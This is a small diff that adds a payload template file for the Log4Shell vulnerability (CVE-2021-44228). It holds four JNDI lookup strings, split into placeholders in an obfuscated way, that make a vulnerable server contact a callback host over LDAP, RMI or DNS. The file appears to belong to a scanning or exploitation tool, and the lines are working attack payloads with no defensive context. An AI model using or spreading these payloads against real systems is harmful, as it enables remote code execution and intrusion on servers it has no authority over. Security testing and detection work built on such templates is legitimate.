@@ -1,0 +1,5 @@
+# CVE-2021-44228 payloads template
+${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}/{{random}}}
+${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}}
+${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{r_proto}}{{m_proto}}{{i_proto}}{{colon}}//{{callback_host}}/{{random}}}
+${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{d_proto}}{{n_proto}}{{s_proto}}{{colon}}//{{callback_host}}/{{random}}}
